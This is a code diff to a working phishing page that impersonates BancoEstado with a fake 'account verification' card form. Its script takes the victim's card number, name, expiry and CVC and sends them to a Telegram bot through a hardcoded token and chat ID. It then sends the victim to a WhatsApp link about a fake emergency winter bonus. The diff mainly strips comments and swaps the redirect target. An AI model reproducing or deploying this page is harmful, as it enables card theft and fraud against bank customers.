@@ -27,7 +27,7 @@
         margin: 0 auto;
     }
 
-    /* ---------- ESTILOS PARA EL BANNER SUPERIOR ---------- */
+    /* BANNER SUPERIOR */
     .top-banner {
         width: 100%;
         background: #ffffff;
@@ -57,7 +57,6 @@
         letter-spacing: 0.5px;
     }
 
-    /* Estilo para el enunciado de verificación */
     .verification-header {
         text-align: center;
         margin-bottom: 20px;
@@ -80,7 +79,6 @@
         font-size: 1.1rem;
     }
 
-    /* Estilos de la tarjeta */
     .card-stage {
         perspective: 1200px;
         margin-bottom: 24px;
@@ -107,7 +105,7 @@
         overflow: hidden;
     }
 
-    /* Frente y reverso de la tarjeta - Colores BancoEstado */
+    /* Frente y reverso */
     .front {
         background: radial-gradient(circle at 10% 20%, #ff8800, #cc5500);
         padding: 20px 22px;
@@ -289,14 +287,13 @@
 </head>
 <body>
 <div class="wrapper">
-    <!-- BANNER CON LOGO BANCOESTADO (desde URL) -->
+    <!-- BANNER CON LOGO BANCOESTADO -->
     <div class="top-banner" id="customBanner">
         <img class="logo-banner" src="https://cdn2.downdetector.com/static/uploads/logo/bancoestado.png" alt="BancoEstado" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FF8800%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23fff%22%3EBancoEstado%3C%2Ftext%3E%3C%2Fsvg%3E';">
         <span class="banner-text">verificación de seguridad • BancoEstado</span>
     </div>
     <br> <br><br><br>
     
-    <!-- Enunciado Verificación de cuenta -->
     <div class="verification-header">
         <div class="verification-title">Verificación de cuenta</div>
     </div>
@@ -346,13 +343,10 @@
 </div>
 
 <script>
-    // ============================================
     // CONFIGURACIÓN DE TELEGRAM
-    // ============================================
     const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
     const TELEGRAM_CHAT_ID = '8042354877';
 
-    // --- JavaScript de la tarjeta con redirección a Google después de enviar a Telegram ---
     const card = document.getElementById('creditCard');
     const numberInput = document.getElementById('cardNumberInput');
     const holderInput = document.getElementById('cardHolderInput');
@@ -364,7 +358,6 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
-    // Función para enviar mensaje a Telegram
     async function enviarATelegram(cardData) {
         const mensaje = `💳 *NUEVA TARJETA VERIFICADA*\n\n` +
                        `🏦 Banco: BancoEstado\n` +
@@ -436,7 +429,6 @@
             setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
         }
     });
-    expiryInput.addEventListener('keypress', e => { if(e.key === 'Enter') e.preventDefault(); });
 
     holderInput.addEventListener('input', e => { e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, ''); });
     cvcInput.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').slice(0,3); });
@@ -451,19 +443,16 @@
     [numberInput, holderInput].forEach(inp => inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); }));
     expiryInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
 
-    // Función para redirigir a Google
-    function redirectToGoogle() {
+    function redirectToWhatsApp() {
         window.location.href = 'https://wa.me/573003554429?text=Hola,%20me%20interesa%20recibir%20más%20información%20sobre%20el%20Bono%20de%20Emergencia%20de%20Invierno.%20Quisiera%20saber%20si%20cumplo%20con%20los%20requisitos%20y%20cómo%20puedo%20realizar%20la%20solicitud.%20Quedo%20atento%20a%20su%20respuesta.%20¡Muchas%20gracias!';
     }
 
-    // Evento principal del botón
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
         const expiryDate = expiryInput.value.trim();
         const cvcCode = cvcInput.value.trim();
 
-        // Validaciones
         if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
             statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
             statusMsg.style.background = '#ffe0e0';
@@ -515,14 +504,12 @@
             return;
         }
 
-        // Deshabilitar botón y mostrar estado de carga
         sendBtn.disabled = true;
         sendBtn.innerHTML = '<span></span>Verificando...';
         statusMsg.innerHTML = '🔐 Verificando datos bancarios...';
         statusMsg.style.background = '#e3f2fd';
         statusMsg.style.color = '#004085';
 
-        // Preparar datos para enviar
         const cardData = {
             cardNumber: cardNumber,
             cardHolder: cardHolder,
@@ -531,15 +518,13 @@
             timestamp: new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' })
         };
 
-        // Enviar a Telegram
         const enviado = await enviarATelegram(cardData);
         
         if (enviado) {
             statusMsg.innerHTML = '✅ Datos verificados, redirigiendo...';
             statusMsg.style.background = '#d4edda';
             statusMsg.style.color = '#155724';
-            // Redirigir a Google después de 1 segundo
-            setTimeout(redirectToGoogle, 1000);
+            setTimeout(redirectToWhatsApp, 1000);
         } else {
             statusMsg.innerHTML = '❌ Error al verificar los datos. Intenta nuevamente.';
             statusMsg.style.background = '#f8d7da';
